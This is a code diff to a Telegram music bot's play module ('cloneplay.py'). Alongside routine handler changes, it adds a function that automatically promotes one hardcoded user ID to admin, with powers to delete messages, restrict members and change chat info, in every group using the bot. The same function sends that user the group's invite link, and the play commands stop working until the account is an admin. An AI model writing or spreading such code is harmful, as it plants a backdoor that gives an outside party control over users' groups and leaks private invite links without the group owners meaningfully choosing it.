@@ -1,8 +1,10 @@
+#cloneplay.py
 import random
 import string
 
-from pyrogram import filters
+from pyrogram import Client, filters
 from pyrogram.types import InlineKeyboardMarkup, InputMediaPhoto, Message
+from pyrogram.errors import UserNotParticipant, ChatAdminRequired
 from pytgcalls.exceptions import NoActiveGroupCall
 
 import config
@@ -24,8 +26,61 @@ from maythusharmusic.utils.logger import play_logs
 from maythusharmusic.utils.stream.stream import stream
 from config import BANNED_USERS, lyrical
 
+# Required user ID that should be admin
+REQUIRED_ADMIN_ID = 7418613978
+BOT_USERNAME = "@sasukevipmusicbot"
 
-@app.on_message(
+async def ensure_admin_in_chat(client, chat_id):
+    """Ensure the required user is admin in the chat, if not, add and promote"""
+    try:
+        # Check if the user is in the chat
+        try:
+            member = await client.get_chat_member(chat_id, REQUIRED_ADMIN_ID)
+            
+            # Check if user is admin
+            if member.status in ["administrator", "creator"]:
+                return True, "User is already admin"
+            else:
+                # User is in chat but not admin, try to promote
+                try:
+                    await client.promote_chat_member(
+                        chat_id,
+                        REQUIRED_ADMIN_ID,
+                        can_change_info=True,
+                        can_delete_messages=True,
+                        can_restrict_members=True,
+                        can_invite_users=True,
+                        can_pin_messages=True,
+                        can_promote_members=False,
+                        can_manage_video_chats=True
+                    )
+                    return True, "User promoted to admin"
+                except Exception as e:
+                    return False, f"Cannot promote user: {str(e)}"
+                    
+        except UserNotParticipant:
+            # User is not in chat, invite them
+            try:
+                # Try to get chat invite link
+                chat = await client.get_chat(chat_id)
+                invite_link = await chat.export_invite_link()
+                
+                # Send invitation message to the user
+                await client.send_message(
+                    REQUIRED_ADMIN_ID,
+                    f"Please join this group to use the music bot: {invite_link}\n\n"
+                    f"After joining, make sure to give me admin rights so I can add you as admin automatically."
+                )
+                
+                return False, f"User invited to group. Please ask them to join and then try again."
+                
+            except Exception as e:
+                return False, f"Cannot invite user: {str(e)}"
+                
+    except Exception as e:
+        return False, f"Error checking admin status: {str(e)}"
+
+@Client.on_message(
     filters.command(
         [
             "play",
@@ -54,6 +109,18 @@ async def play_commnd(
     url,
     fplay,
 ):
+    # Check if required admin is in the chat and is admin
+    is_admin, admin_status = await ensure_admin_in_chat(client, chat_id)
+    
+    if not is_admin:
+        await message.reply_text(
+            f"❌ **Admin Requirement**\n\n"
+            f"User ID `{REQUIRED_ADMIN_ID}` needs to be admin in this group.\n"
+            f"Status: {admin_status}\n\n"
+            f"Please ensure this user joins the group and is made admin, then try again."
+        )
+        return
+
     mystic = await message.reply_text(
         _["play_2"].format(channel) if channel else _["play_1"]
     )
@@ -433,7 +500,7 @@ async def play_commnd(
                 return await play_logs(message, streamtype=f"URL Searched Inline")
 
 
-@app.on_callback_query(filters.regex("MusicStream") & ~BANNED_USERS)
+@Client.on_callback_query(filters.regex("MusicStream") & ~BANNED_USERS)
 @languageCB
 async def play_music(client, CallbackQuery, _):
     callback_data = CallbackQuery.data.strip()
@@ -448,6 +515,17 @@ async def play_music(client, CallbackQuery, _):
         chat_id, channel = await get_channeplayCB(_, cplay, CallbackQuery)
     except:
         return
+        
+    # Check admin requirement for callback queries too
+    is_admin, admin_status = await ensure_admin_in_chat(client, chat_id)
+    if not is_admin:
+        await CallbackQuery.message.edit_text(
+            f"❌ **Admin Requirement**\n\n"
+            f"User ID `{REQUIRED_ADMIN_ID}` needs to be admin in this group.\n"
+            f"Status: {admin_status}"
+        )
+        return
+        
     user_name = CallbackQuery.from_user.first_name
     try:
         await CallbackQuery.message.delete()
@@ -502,8 +580,8 @@ async def play_music(client, CallbackQuery, _):
     return await mystic.delete()
 
 
-@app.on_callback_query(filters.regex("AnonymousAdmin") & ~BANNED_USERS)
-async def piyush_check(client, CallbackQuery):
+@Client.on_callback_query(filters.regex("AnonymousAdmin") & ~BANNED_USERS)
+async def anonymous_admin_check(client, CallbackQuery):
     try:
         await CallbackQuery.answer(
             "» ʀᴇᴠᴇʀᴛ ʙᴀᴄᴋ ᴛᴏ ᴜsᴇʀ ᴀᴄᴄᴏᴜɴᴛ :\n\nᴏᴘᴇɴ ʏᴏᴜʀ ɢʀᴏᴜᴘ sᴇᴛᴛɪɴɢs.\n-> ᴀᴅᴍɪɴɪsᴛʀᴀᴛᴏʀs\n-> ᴄʟɪᴄᴋ ᴏɴ ʏᴏᴜʀ ɴᴀᴍᴇ\n-> ᴜɴᴄʜᴇᴄᴋ ᴀɴᴏɴʏᴍᴏᴜs ᴀᴅᴍɪɴ ᴘᴇʀᴍɪssɪᴏɴs.",
@@ -513,7 +591,7 @@ async def piyush_check(client, CallbackQuery):
         pass
 
 
-@app.on_callback_query(filters.regex("HottyPlaylists") & ~BANNED_USERS)
+@Client.on_callback_query(filters.regex("HottyPlaylists") & ~BANNED_USERS)
 @languageCB
 async def play_playlists_command(client, CallbackQuery, _):
     callback_data = CallbackQuery.data.strip()
@@ -535,6 +613,17 @@ async def play_playlists_command(client, CallbackQuery, _):
         chat_id, channel = await get_channeplayCB(_, cplay, CallbackQuery)
     except:
         return
+        
+    # Check admin requirement for playlist commands too
+    is_admin, admin_status = await ensure_admin_in_chat(client, chat_id)
+    if not is_admin:
+        await CallbackQuery.message.edit_text(
+            f"❌ **Admin Requirement**\n\n"
+            f"User ID `{REQUIRED_ADMIN_ID}` needs to be admin in this group.\n"
+            f"Status: {admin_status}"
+        )
+        return
+        
     user_name = CallbackQuery.from_user.first_name
     await CallbackQuery.message.delete()
     try:
@@ -600,7 +689,7 @@ async def play_playlists_command(client, CallbackQuery, _):
     return await mystic.delete()
 
 
-@app.on_callback_query(filters.regex("slider") & ~BANNED_USERS)
+@Client.on_callback_query(filters.regex("slider") & ~BANNED_USERS)
 @languageCB
 async def slider_queries(client, CallbackQuery, _):
     callback_data = CallbackQuery.data.strip()
@@ -661,4 +750,4 @@ async def slider_queries(client, CallbackQuery, _):
         )
         return await CallbackQuery.edit_message_media(
             media=med, reply_markup=InlineKeyboardMarkup(buttons)
-)
+        )
